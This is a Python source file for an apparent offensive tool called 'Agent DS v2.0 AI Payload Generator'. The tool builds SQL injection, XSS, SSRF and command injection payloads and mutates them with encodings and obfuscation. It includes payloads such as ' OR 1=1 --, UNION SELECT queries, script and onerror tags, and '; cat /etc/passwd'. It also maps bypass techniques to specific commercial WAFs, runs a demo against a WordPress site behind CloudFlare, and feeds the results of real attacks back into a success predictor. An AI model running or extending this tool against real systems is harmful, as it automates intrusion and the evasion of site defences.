#!/usr/bin/env python3
"""
Agent DS v2.0 - AI Payload Generator
===================================

Advanced transformer-based dynamic payload creation system with context-aware
exploit generation, mutation algorithms, and machine learning models for 
adaptive payload optimization based on target characteristics.

Features:
- Transformer-based payload generation using advanced NLP models
- Context-aware exploit creation based on target technology stack
- Mutation algorithms for payload obfuscation and WAF bypass
- Machine learning models for success probability prediction
- Adaptive payload optimization based on real-time feedback
- Dynamic encoding and evasion technique application

Author: Agent DS Development Team
Version: 2.0.0
Date: September 2025
"""

import asyncio
import json
import random
import re
import base64
import urllib.parse
import hashlib
import time
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass, asdict
from enum import Enum
import logging

# Machine Learning and AI imports
try:
    import numpy as np
    import torch
    import torch.nn as nn
    from transformers import GPT2LMHeadModel, GPT2Tokenizer, pipeline
    from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
    from sklearn.neural_network import MLPClassifier
    from sklearn.preprocessing import StandardScaler, LabelEncoder
    from sklearn.model_selection import train_test_split
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("[WARNING] ML dependencies not available. Using fallback payload generation.")

class PayloadType(Enum):
    """Payload type enumeration"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    SSRF = "ssrf"
    SSTI = "ssti"
    COMMAND_INJECTION = "command_injection"
    NOSQL_INJECTION = "nosql_injection"
    LDAP_INJECTION = "ldap_injection"
    XXE = "xxe"
    RCE = "rce"
    FILE_INCLUSION = "file_inclusion"

class EvasionTechnique(Enum):
    """Evasion technique enumeration"""
    ENCODING = "encoding"
    OBFUSCATION = "obfuscation"
    CASE_VARIATION = "case_variation"
    COMMENT_INSERTION = "comment_insertion"
    UNICODE_NORMALIZATION = "unicode_normalization"
    DOUBLE_ENCODING = "double_encoding"
    NULL_BYTE_INJECTION = "null_byte_injection"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"

@dataclass
class TargetContext:
    """Target context information for payload generation"""
    technology_stack: List[str]
    web_server: Optional[str] = None
    database_type: Optional[str] = None
    cms_type: Optional[str] = None
    programming_language: Optional[str] = None
    detected_waf: Optional[str] = None
    security_headers: List[str] = None
    input_validation: bool = False
    encoding_detected: List[str] = None
    vulnerability_history: List[str] = None
    response_patterns: Dict[str, Any] = None

@dataclass
class PayloadTemplate:
    """Payload template structure"""
    payload_type: PayloadType
    base_payload: str
    context_requirements: List[str]
    success_indicators: List[str]
    failure_indicators: List[str]
    evasion_techniques: List[EvasionTechnique]
    complexity_score: float
    effectiveness_rating: float

@dataclass
class GeneratedPayload:
    """Generated payload with metadata"""
    payload: str
    payload_type: PayloadType
    original_template: str
    applied_mutations: List[str]
    evasion_techniques: List[EvasionTechnique]
    context_adaptation: Dict[str, Any]
    predicted_success_rate: float
    confidence_score: float
    generation_timestamp: float
    target_context: TargetContext

class TransformerPayloadModel:
    """Transformer-based payload generation model"""
    
    def __init__(self):
        self.model = None
        self.tokenizer = None
        self.device = "cuda" if torch.cuda.is_available() else "cpu"
        self.max_length = 512
        self.temperature = 0.8
        self.top_p = 0.9
        
        if ML_AVAILABLE:
            self._initialize_model()
    
    def _initialize_model(self):
        """Initialize the transformer model"""
        try:
            # Using GPT-2 as base model for payload generation
            self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
            self.model = GPT2LMHeadModel.from_pretrained('gpt2')
            
            # Add padding token
            self.tokenizer.pad_token = self.tokenizer.eos_token
            
            # Move to device
            self.model.to(self.device)
            self.model.eval()
            
            print(f"[INFO] Transformer model initialized on {self.device}")
            
        except Exception as e:
            print(f"[ERROR] Failed to initialize transformer model: {e}")
            self.model = None
            self.tokenizer = None
    
    async def generate_payload_variants(self, base_payload: str, context: TargetContext, 
                                      variant_count: int = 5) -> List[str]:
        """Generate payload variants using transformer model"""
        if not self.model or not self.tokenizer:
            return self._fallback_generation(base_payload, variant_count)
        
        try:
            # Create context-aware prompt
            prompt = self._create_contextual_prompt(base_payload, context)
            
            # Tokenize input
            inputs = self.tokenizer.encode(prompt, return_tensors='pt', 
                                         truncation=True, max_length=self.max_length)
            inputs = inputs.to(self.device)
            
            variants = []
            
            for _ in range(variant_count):
                with torch.no_grad():
                    # Generate with sampling
                    outputs = self.model.generate(
                        inputs,
                        max_length=inputs.shape[1] + 100,
                        temperature=self.temperature,
                        top_p=self.top_p,
                        do_sample=True,
                        pad_token_id=self.tokenizer.eos_token_id,
                        num_return_sequences=1
                    )
                
                # Decode and extract payload
                generated_text = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
                variant = self._extract_payload_from_generation(generated_text, base_payload)
                
                if variant and variant not in variants:
                    variants.append(variant)
            
            return variants[:variant_count]
            
        except Exception as e:
            print(f"[ERROR] Transformer generation failed: {e}")
            return self._fallback_generation(base_payload, variant_count)
    
    def _create_contextual_prompt(self, base_payload: str, context: TargetContext) -> str:
        """Create context-aware prompt for payload generation"""
        prompt_parts = [
            "Generate advanced penetration testing payload variations for:",
            f"Technology Stack: {', '.join(context.technology_stack)}",
            f"Database: {context.database_type or 'Unknown'}",
            f"Web Server: {context.web_server or 'Unknown'}",
            f"Base Payload: {base_payload}",
            "Generate creative variations that:"
        ]
        
        if context.detected_waf:
            prompt_parts.append(f"- Bypass {context.detected_waf} WAF")
        
        if context.input_validation:
            prompt_parts.append("- Evade input validation")
        
        prompt_parts.extend([
            "- Maintain attack effectiveness",
            "- Use different encoding techniques",
            "- Apply obfuscation methods",
            "Generated payload:"
        ])
        
        return "\n".join(prompt_parts)
    
    def _extract_payload_from_generation(self, generated_text: str, base_payload: str) -> Optional[str]:
        """Extract usable payload from generated text"""
        lines = generated_text.split('\n')
        
        # Look for lines that appear to be payloads
        for line in lines:
            line = line.strip()
            
            # Skip empty lines and prompts
            if not line or line.startswith(('Generate', 'Technology', 'Database', 'Web Server')):
                continue
            
            # Check if line contains payload-like content
            if any(marker in line.lower() for marker in ['select', 'union', 'script', 'alert', 
                                                        'exec', 'system', 'file:', 'http:']):
                return line
        
        return None
    
    def _fallback_generation(self, base_payload: str, variant_count: int) -> List[str]:
        """Fallback payload generation without transformer"""
        variants = []
        
        # Simple mutation-based generation
        for i in range(variant_count):
            variant = self._apply_simple_mutations(base_payload, i)
            variants.append(variant)
        
        return variants
    
    def _apply_simple_mutations(self, payload: str, seed: int) -> str:
        """Apply simple mutations for fallback generation"""
        random.seed(seed)
        mutations = [
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('=', '%3d'),
            lambda p: p.replace("'", "%27"),
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: urllib.parse.quote(p),
            lambda p: base64.b64encode(p.encode()).decode()
        ]
        
        mutation = random.choice(mutations)
        return mutation(payload)

class PayloadMutationEngine:
    """Advanced payload mutation and obfuscation engine"""
    
    def __init__(self):
        self.encoding_techniques = {
            'url': self._url_encode,
            'html': self._html_encode,
            'unicode': self._unicode_encode,
            'base64': self._base64_encode,
            'hex': self._hex_encode,
            'double_url': self._double_url_encode,
            'mixed': self._mixed_encode
        }
        
        self.obfuscation_techniques = {
            'case_variation': self._case_variation,
            'comment_insertion': self._comment_insertion,
            'whitespace_manipulation': self._whitespace_manipulation,
            'concatenation': self._concatenation,
            'function_wrapping': self._function_wrapping,
            'unicode_substitution': self._unicode_substitution
        }
    
    async def mutate_payload(self, payload: str, target_context: TargetContext, 
                           mutation_intensity: float = 0.7) -> List[str]:
        """Generate mutated payload variations"""
        mutations = []
        
        # Determine mutation techniques based on context
        techniques = self._select_mutation_techniques(target_context, mutation_intensity)
        
        for technique_set in techniques:
            mutated = payload
            applied_techniques = []
            
            for technique in technique_set:
                if technique in self.encoding_techniques:
                    mutated = self.encoding_techniques[technique](mutated)
                    applied_techniques.append(f"encoding_{technique}")
                elif technique in self.obfuscation_techniques:
                    mutated = self.obfuscation_techniques[technique](mutated)
                    applied_techniques.append(f"obfuscation_{technique}")
            
            mutations.append({
                'payload': mutated,
                'techniques': applied_techniques,
                'complexity': len(applied_techniques)
            })
        
        return mutations
    
    def _select_mutation_techniques(self, context: TargetContext, 
                                  intensity: float) -> List[List[str]]:
        """Select appropriate mutation techniques based on context"""
        techniques = []
        
        # Base techniques
        base_techniques = ['url', 'case_variation', 'whitespace_manipulation']
        
        # WAF-specific techniques
        if context.detected_waf:
            waf_techniques = self._get_waf_bypass_techniques(context.detected_waf)
            base_techniques.extend(waf_techniques)
        
        # Technology-specific techniques
        if 'php' in [tech.lower() for tech in context.technology_stack]:
            base_techniques.extend(['concatenation', 'function_wrapping'])
        
        if 'javascript' in [tech.lower() for tech in context.technology_stack]:
            base_techniques.extend(['unicode_substitution', 'hex'])
        
        # Generate technique combinations based on intensity
        num_combinations = max(1, int(intensity * 10))
        
        for _ in range(num_combinations):
            combination_size = random.randint(1, min(3, len(base_techniques)))
            combination = random.sample(base_techniques, combination_size)
            techniques.append(combination)
        
        return techniques
    
    def _get_waf_bypass_techniques(self, waf_type: str) -> List[str]:
        """Get WAF-specific bypass techniques"""
        waf_bypasses = {
            'cloudflare': ['double_url', 'unicode', 'comment_insertion'],
            'aws_waf': ['mixed', 'concatenation', 'case_variation'],
            'imperva': ['hex', 'function_wrapping', 'unicode_substitution'],
            'akamai': ['base64', 'whitespace_manipulation', 'double_url'],
            'generic': ['url', 'html', 'case_variation']
        }
        
        return waf_bypasses.get(waf_type.lower(), waf_bypasses['generic'])
    
    # Encoding techniques
    def _url_encode(self, payload: str) -> str:
        return urllib.parse.quote(payload, safe='')
    
    def _html_encode(self, payload: str) -> str:
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
    
    def _unicode_encode(self, payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def _base64_encode(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()
    
    def _hex_encode(self, payload: str) -> str:
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _double_url_encode(self, payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    def _mixed_encode(self, payload: str) -> str:
        result = ""
        for i, c in enumerate(payload):
            if i % 3 == 0:
                result += urllib.parse.quote(c)
            elif i % 3 == 1:
                result += f'%{ord(c):02x}'
            else:
                result += c
        return result
    
    # Obfuscation techniques
    def _case_variation(self, payload: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    def _comment_insertion(self, payload: str) -> str:
        # Insert SQL-style comments
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        for keyword in keywords:
            if keyword in payload.upper():
                payload = payload.replace(keyword, f'{keyword}/**/').replace(keyword.lower(), f'{keyword.lower()}/**/')
        return payload
    
    def _whitespace_manipulation(self, payload: str) -> str:
        # Replace spaces with alternative whitespace
        alternatives = ['\t', '\n', '\r', '/**/', '+', '%20', '%09', '%0a']
        return payload.replace(' ', random.choice(alternatives))
    
    def _concatenation(self, payload: str) -> str:
        # Split strings and concatenate (PHP/SQL style)
        if "'" in payload:
            parts = payload.split("'")
            return "'+'".join(f"'{part}'" for part in parts if part)
        return payload
    
    def _function_wrapping(self, payload: str) -> str:
        # Wrap in functions (context-dependent)
        wrappers = ['eval', 'String.fromCharCode', 'unescape', 'decodeURIComponent']
        wrapper = random.choice(wrappers)
        return f'{wrapper}("{payload}")'
    
    def _unicode_substitution(self, payload: str) -> str:
        # Replace characters with unicode equivalents
        substitutions = {
            'a': '\u0061', 'e': '\u0065', 'i': '\u0069', 'o': '\u006f', 'u': '\u0075',
            '<': '\u003c', '>': '\u003e', '"': '\u0022', "'": '\u0027'
        }
        
        for char, unicode_char in substitutions.items():
            if char in payload:
                payload = payload.replace(char, unicode_char)
        return payload

class ContextAwarePayloadOptimizer:
    """Context-aware payload optimization using machine learning"""
    
    def __init__(self):
        self.success_predictor = None
        self.feature_scaler = StandardScaler()
        self.label_encoder = LabelEncoder()
        self.training_data = []
        self.model_trained = False
        
        if ML_AVAILABLE:
            self._initialize_ml_models()
    
    def _initialize_ml_models(self):
        """Initialize machine learning models"""
        try:
            # Ensemble model for success prediction
            self.success_predictor = GradientBoostingClassifier(
                n_estimators=100,
                learning_rate=0.1,
                max_depth=6,
                random_state=42
            )
            
            print("[INFO] ML models initialized for payload optimization")
            
        except Exception as e:
            print(f"[ERROR] Failed to initialize ML models: {e}")
    
    async def optimize_payload(self, payload: str, target_context: TargetContext, 
                             historical_data: List[Dict] = None) -> Dict[str, Any]:
        """Optimize payload based on context and historical data"""
        if not ML_AVAILABLE or not self.success_predictor:
            return self._fallback_optimization(payload, target_context)
        
        try:
            # Extract features from context and payload
            features = self._extract_features(payload, target_context)
            
            # Predict success probability if model is trained
            if self.model_trained:
                success_probability = self._predict_success(features)
            else:
                success_probability = 0.5  # Default
            
            # Generate optimization recommendations
            recommendations = self._generate_recommendations(payload, target_context, features)
            
            return {
                'optimized_payload': payload,
                'success_probability': success_probability,
                'confidence_score': min(0.9, success_probability + 0.1),
                'recommendations': recommendations,
                'feature_analysis': self._analyze_features(features),
                'optimization_applied': True
            }
            
        except Exception as e:
            print(f"[ERROR] Payload optimization failed: {e}")
            return self._fallback_optimization(payload, target_context)
    
    def _extract_features(self, payload: str, context: TargetContext) -> np.ndarray:
        """Extract numerical features for ML models"""
        features = []
        
        # Payload characteristics
        features.append(len(payload))  # Length
        features.append(payload.count("'"))  # Quote count
        features.append(payload.count('"'))  # Double quote count
        features.append(payload.count('='))  # Equals count
        features.append(payload.count('<'))  # Tag count
        features.append(payload.count('('))  # Function call count
        features.append(len(re.findall(r'[0-9]+', payload)))  # Number count
        features.append(1 if any(keyword in payload.lower() for keyword in 
                               ['select', 'union', 'script', 'alert']) else 0)  # Contains keywords
        
        # Context features
        features.append(len(context.technology_stack))  # Tech stack size
        features.append(1 if context.detected_waf else 0)  # WAF present
        features.append(1 if context.input_validation else 0)  # Input validation
        features.append(len(context.security_headers or []))  # Security headers count
        
        # Technology-specific features
        features.append(1 if any('php' in tech.lower() for tech in context.technology_stack) else 0)
        features.append(1 if any('asp' in tech.lower() for tech in context.technology_stack) else 0)
        features.append(1 if any('java' in tech.lower() for tech in context.technology_stack) else 0)
        features.append(1 if any('python' in tech.lower() for tech in context.technology_stack) else 0)
        
        # Database features
        db_types = ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite']
        for db_type in db_types:
            features.append(1 if context.database_type and db_type in context.database_type.lower() else 0)
        
        return np.array(features).reshape(1, -1)
    
    def _predict_success(self, features: np.ndarray) -> float:
        """Predict payload success probability"""
        try:
            # Scale features
            scaled_features = self.feature_scaler.transform(features)
            
            # Predict probability
            probability = self.success_predictor.predict_proba(scaled_features)[0]
            
            # Return probability of success (class 1)
            return probability[1] if len(probability) > 1 else 0.5
            
        except Exception as e:
            print(f"[ERROR] Success prediction failed: {e}")
            return 0.5
    
    def _generate_recommendations(self, payload: str, context: TargetContext, 
                                features: np.ndarray) -> List[str]:
        """Generate optimization recommendations"""
        recommendations = []
        
        # Length-based recommendations
        if len(payload) > 1000:
            recommendations.append("Consider shorter payload variants for better stealth")
        elif len(payload) < 50:
            recommendations.append("Payload might be too simple, consider more complex variants")
        
        # Context-based recommendations
        if context.detected_waf:
            recommendations.append(f"Apply {context.detected_waf} WAF bypass techniques")
            recommendations.append("Use encoding and obfuscation methods")
        
        if context.input_validation:
            recommendations.append("Focus on validation bypass techniques")
            recommendations.append("Try alternative injection vectors")
        
        # Technology-specific recommendations
        if 'php' in [tech.lower() for tech in context.technology_stack]:
            recommendations.append("Use PHP-specific function calls and concatenation")
        
        if context.database_type:
            recommendations.append(f"Optimize for {context.database_type} database syntax")
        
        return recommendations
    
    def _analyze_features(self, features: np.ndarray) -> Dict[str, Any]:
        """Analyze extracted features"""
        feature_names = [
            'payload_length', 'quote_count', 'double_quote_count', 'equals_count',
            'tag_count', 'function_count', 'number_count', 'contains_keywords',
            'tech_stack_size', 'waf_present', 'input_validation', 'security_headers',
            'php_detected', 'asp_detected', 'java_detected', 'python_detected',
            'mysql', 'postgresql', 'mssql', 'oracle', 'sqlite'
        ]
        
        analysis = {}
        feature_values = features.flatten()
        
        for i, name in enumerate(feature_names[:len(feature_values)]):
            analysis[name] = float(feature_values[i])
        
        return analysis
    
    def _fallback_optimization(self, payload: str, context: TargetContext) -> Dict[str, Any]:
        """Fallback optimization without ML"""
        # Simple heuristic-based optimization
        score = 0.5
        
        # Adjust score based on context
        if context.detected_waf:
            score -= 0.2
        if context.input_validation:
            score -= 0.1
        if len(context.technology_stack) > 3:
            score += 0.1
        
        return {
            'optimized_payload': payload,
            'success_probability': max(0.1, min(0.9, score)),
            'confidence_score': 0.6,
            'recommendations': ['Use manual testing approach', 'Apply basic evasion techniques'],
            'feature_analysis': {'basic_analysis': True},
            'optimization_applied': False
        }
    
    async def update_model(self, payload_results: List[Dict]):
        """Update ML model with new payload results"""
        if not ML_AVAILABLE or not payload_results:
            return
        
        try:
            # Add to training data
            self.training_data.extend(payload_results)
            
            # Retrain if we have enough data
            if len(self.training_data) >= 50:
                await self._retrain_model()
                
        except Exception as e:
            print(f"[ERROR] Model update failed: {e}")
    
    async def _retrain_model(self):
        """Retrain the ML model with accumulated data"""
        try:
            # Prepare training data
            X = []
            y = []
            
            for result in self.training_data:
                features = self._extract_features(result['payload'], result['context'])
                X.append(features.flatten())
                y.append(1 if result['success'] else 0)
            
            X = np.array(X)
            y = np.array(y)
            
            # Scale features
            X_scaled = self.feature_scaler.fit_transform(X)
            
            # Train model
            self.success_predictor.fit(X_scaled, y)
            self.model_trained = True
            
            print(f"[INFO] ML model retrained with {len(self.training_data)} samples")
            
        except Exception as e:
            print(f"[ERROR] Model retraining failed: {e}")

class AIPayloadGenerator:
    """Main AI Payload Generator coordinating all components"""
    
    def __init__(self):
        self.transformer_model = TransformerPayloadModel()
        self.mutation_engine = PayloadMutationEngine()
        self.optimizer = ContextAwarePayloadOptimizer()
        
        # Payload templates database
        self.payload_templates = self._initialize_payload_templates()
        
        # Performance metrics
        self.generation_stats = {
            'total_generated': 0,
            'successful_generations': 0,
            'average_generation_time': 0.0,
            'cache_hits': 0
        }
        
        # Payload cache for performance
        self.payload_cache = {}
        
        print("[INFO] AI Payload Generator initialized with all components")
    
    def _initialize_payload_templates(self) -> Dict[PayloadType, List[PayloadTemplate]]:
        """Initialize base payload templates"""
        templates = {
            PayloadType.SQL_INJECTION: [
                PayloadTemplate(
                    payload_type=PayloadType.SQL_INJECTION,
                    base_payload="' OR 1=1 --",
                    context_requirements=['database'],
                    success_indicators=['mysql', 'syntax error', 'sql'],
                    failure_indicators=['blocked', 'filtered', 'waf'],
                    evasion_techniques=[EvasionTechnique.ENCODING, EvasionTechnique.COMMENT_INSERTION],
                    complexity_score=0.3,
                    effectiveness_rating=0.8
                ),
                PayloadTemplate(
                    payload_type=PayloadType.SQL_INJECTION,
                    base_payload="' UNION SELECT user(),version(),database() --",
                    context_requirements=['database', 'mysql'],
                    success_indicators=['mysql', 'version', 'user'],
                    failure_indicators=['blocked', 'filtered'],
                    evasion_techniques=[EvasionTechnique.OBFUSCATION, EvasionTechnique.CASE_VARIATION],
                    complexity_score=0.6,
                    effectiveness_rating=0.9
                )
            ],
            PayloadType.XSS: [
                PayloadTemplate(
                    payload_type=PayloadType.XSS,
                    base_payload="<script>alert('XSS')</script>",
                    context_requirements=['web'],
                    success_indicators=['alert', 'script executed'],
                    failure_indicators=['blocked', 'csp', 'filtered'],
                    evasion_techniques=[EvasionTechnique.ENCODING, EvasionTechnique.OBFUSCATION],
                    complexity_score=0.4,
                    effectiveness_rating=0.7
                ),
                PayloadTemplate(
                    payload_type=PayloadType.XSS,
                    base_payload="<img src=x onerror=alert('XSS')>",
                    context_requirements=['web', 'html'],
                    success_indicators=['alert', 'onerror'],
                    failure_indicators=['blocked', 'csp'],
                    evasion_techniques=[EvasionTechnique.UNICODE_NORMALIZATION, EvasionTechnique.CASE_VARIATION],
                    complexity_score=0.5,
                    effectiveness_rating=0.8
                )
            ],
            PayloadType.SSRF: [
                PayloadTemplate(
                    payload_type=PayloadType.SSRF,
                    base_payload="http://127.0.0.1:80/",
                    context_requirements=['web', 'http'],
                    success_indicators=['localhost', 'internal', 'connection'],
                    failure_indicators=['blocked', 'filtered', 'invalid'],
                    evasion_techniques=[EvasionTechnique.ENCODING, EvasionTechnique.DOUBLE_ENCODING],
                    complexity_score=0.5,
                    effectiveness_rating=0.7
                )
            ],
            PayloadType.COMMAND_INJECTION: [
                PayloadTemplate(
                    payload_type=PayloadType.COMMAND_INJECTION,
                    base_payload="; cat /etc/passwd",
                    context_requirements=['unix', 'command'],
                    success_indicators=['root:', 'passwd', 'uid'],
                    failure_indicators=['blocked', 'invalid', 'permission'],
                    evasion_techniques=[EvasionTechnique.OBFUSCATION, EvasionTechnique.WHITESPACE_MANIPULATION],
                    complexity_score=0.6,
                    effectiveness_rating=0.8
                )
            ]
        }
        
        return templates
    
    async def generate_adaptive_payload(self, payload_type: PayloadType, 
                                      target_context: TargetContext,
                                      intensity: float = 0.7,
                                      variant_count: int = 10) -> List[GeneratedPayload]:
        """Generate adaptive payloads for specific attack type"""
        start_time = time.time()
        
        try:
            # Check cache first
            cache_key = self._generate_cache_key(payload_type, target_context, intensity)
            if cache_key in self.payload_cache:
                self.generation_stats['cache_hits'] += 1
                return self.payload_cache[cache_key]
            
            generated_payloads = []
            
            # Get base templates for payload type
            templates = self.payload_templates.get(payload_type, [])
            
            for template in templates:
                # Generate transformer-based variants
                transformer_variants = await self.transformer_model.generate_payload_variants(
                    template.base_payload, target_context, variant_count // len(templates) + 1
                )
                
                for variant in transformer_variants:
                    # Apply mutations
                    mutations = await self.mutation_engine.mutate_payload(
                        variant, target_context, intensity
                    )
                    
                    for mutation in mutations:
                        # Optimize payload
                        optimization = await self.optimizer.optimize_payload(
                            mutation['payload'], target_context
                        )
                        
                        # Create generated payload object
                        generated_payload = GeneratedPayload(
                            payload=optimization['optimized_payload'],
                            payload_type=payload_type,
                            original_template=template.base_payload,
                            applied_mutations=mutation['techniques'],
                            evasion_techniques=template.evasion_techniques,
                            context_adaptation=optimization.get('feature_analysis', {}),
                            predicted_success_rate=optimization['success_probability'],
                            confidence_score=optimization['confidence_score'],
                            generation_timestamp=time.time(),
                            target_context=target_context
                        )
                        
                        generated_payloads.append(generated_payload)
            
            # Sort by predicted success rate
            generated_payloads.sort(key=lambda x: x.predicted_success_rate, reverse=True)
            
            # Limit to requested count
            result = generated_payloads[:variant_count]
            
            # Cache result
            self.payload_cache[cache_key] = result
            
            # Update stats
            self.generation_stats['total_generated'] += len(result)
            self.generation_stats['successful_generations'] += 1
            
            generation_time = time.time() - start_time
            self.generation_stats['average_generation_time'] = (
                (self.generation_stats['average_generation_time'] * 
                 (self.generation_stats['successful_generations'] - 1) + generation_time) /
                self.generation_stats['successful_generations']
            )
            
            return result
            
        except Exception as e:
            print(f"[ERROR] Payload generation failed: {e}")
            return []
    
    async def generate_context_aware_payloads(self, target_context: TargetContext,
                                            intensity: float = 0.7) -> Dict[PayloadType, List[GeneratedPayload]]:
        """Generate context-aware payloads for all applicable attack types"""
        results = {}
        
        # Determine applicable payload types based on context
        applicable_types = self._determine_applicable_payload_types(target_context)
        
        # Generate payloads for each type
        for payload_type in applicable_types:
            payloads = await self.generate_adaptive_payload(
                payload_type, target_context, intensity, variant_count=5
            )
            results[payload_type] = payloads
        
        return results
    
    def _determine_applicable_payload_types(self, context: TargetContext) -> List[PayloadType]:
        """Determine applicable payload types based on target context"""
        applicable_types = []
        
        # Always include basic web attacks
        applicable_types.extend([PayloadType.XSS, PayloadType.SSRF])
        
        # Database-related attacks
        if context.database_type or any('sql' in tech.lower() for tech in context.technology_stack):
            applicable_types.append(PayloadType.SQL_INJECTION)
            applicable_types.append(PayloadType.NOSQL_INJECTION)
        
        # Server-side template injection
        if any(tech in context.technology_stack for tech in ['Jinja2', 'Twig', 'Smarty', 'Velocity']):
            applicable_types.append(PayloadType.SSTI)
        
        # Command injection for dynamic environments
        if any(tech in context.technology_stack for tech in ['PHP', 'Python', 'Ruby', 'Node.js']):
            applicable_types.append(PayloadType.COMMAND_INJECTION)
        
        # XML-related attacks
        if any('xml' in tech.lower() for tech in context.technology_stack):
            applicable_types.append(PayloadType.XXE)
        
        return applicable_types
    
    def _generate_cache_key(self, payload_type: PayloadType, context: TargetContext, 
                          intensity: float) -> str:
        """Generate cache key for payload combinations"""
        context_str = f"{context.technology_stack}_{context.database_type}_{context.detected_waf}"
        cache_data = f"{payload_type.value}_{context_str}_{intensity}"
        return hashlib.md5(cache_data.encode()).hexdigest()
    
    async def update_payload_effectiveness(self, payload: str, success: bool, 
                                         response_data: Dict[str, Any]):
        """Update payload effectiveness based on real attack results"""
        try:
            # Update optimizer with new data
            payload_result = {
                'payload': payload,
                'success': success,
                'context': response_data.get('context'),
                'response': response_data
            }
            
            await self.optimizer.update_model([payload_result])
            
            print(f"[INFO] Updated payload effectiveness: {payload[:50]}... -> {success}")
            
        except Exception as e:
            print(f"[ERROR] Failed to update payload effectiveness: {e}")
    
    def get_generation_statistics(self) -> Dict[str, Any]:
        """Get payload generation statistics"""
        return {
            **self.generation_stats,
            'cache_size': len(self.payload_cache),
            'ml_available': ML_AVAILABLE,
            'transformer_available': self.transformer_model.model is not None
        }
    
    async def clear_cache(self):
        """Clear payload cache"""
        self.payload_cache.clear()
        print("[INFO] Payload cache cleared")

# Example usage and testing
async def main():
    """Example usage of AI Payload Generator"""
    print("=== Agent DS v2.0 - AI Payload Generator Demo ===")
    
    # Initialize generator
    generator = AIPayloadGenerator()
    
    # Create target context
    target_context = TargetContext(
        technology_stack=['PHP', 'MySQL', 'Apache'],
        web_server='Apache/2.4.41',
        database_type='MySQL 8.0',
        cms_type='WordPress',
        programming_language='PHP',
        detected_waf='CloudFlare',
        security_headers=['X-Frame-Options', 'X-XSS-Protection'],
        input_validation=True,
        encoding_detected=['UTF-8'],
        vulnerability_history=['CVE-2021-34527', 'CVE-2021-44228']
    )
    
    print(f"Target Context: {target_context.technology_stack}")
    print(f"WAF Detected: {target_context.detected_waf}")
    
    # Generate context-aware payloads
    print("\n[INFO] Generating context-aware payloads...")
    all_payloads = await generator.generate_context_aware_payloads(target_context, intensity=0.8)
    
    # Display results
    for payload_type, payloads in all_payloads.items():
        print(f"\n=== {payload_type.value.upper()} PAYLOADS ===")
        for i, payload in enumerate(payloads[:3], 1):
            print(f"{i}. Payload: {payload.payload}")
            print(f"   Success Rate: {payload.predicted_success_rate:.2f}")
            print(f"   Confidence: {payload.confidence_score:.2f}")
            print(f"   Mutations: {', '.join(payload.applied_mutations)}")
            print()
    
    # Generate specific SQL injection payloads
    print("\n[INFO] Generating advanced SQL injection payloads...")
    sql_payloads = await generator.generate_adaptive_payload(
        PayloadType.SQL_INJECTION, target_context, intensity=0.9, variant_count=5
    )
    
    for i, payload in enumerate(sql_payloads, 1):
        print(f"{i}. {payload.payload}")
        print(f"   Predicted Success: {payload.predicted_success_rate:.3f}")
    
    # Show statistics
    stats = generator.get_generation_statistics()
    print(f"\n=== GENERATION STATISTICS ===")
    print(f"Total Generated: {stats['total_generated']}")
    print(f"Successful Generations: {stats['successful_generations']}")
    print(f"Average Generation Time: {stats['average_generation_time']:.3f}s")
    print(f"Cache Hits: {stats['cache_hits']}")
    print(f"ML Available: {stats['ml_available']}")
    print(f"Transformer Available: {stats['transformer_available']}")

if __name__ == "__main__":
    asyncio.run(main())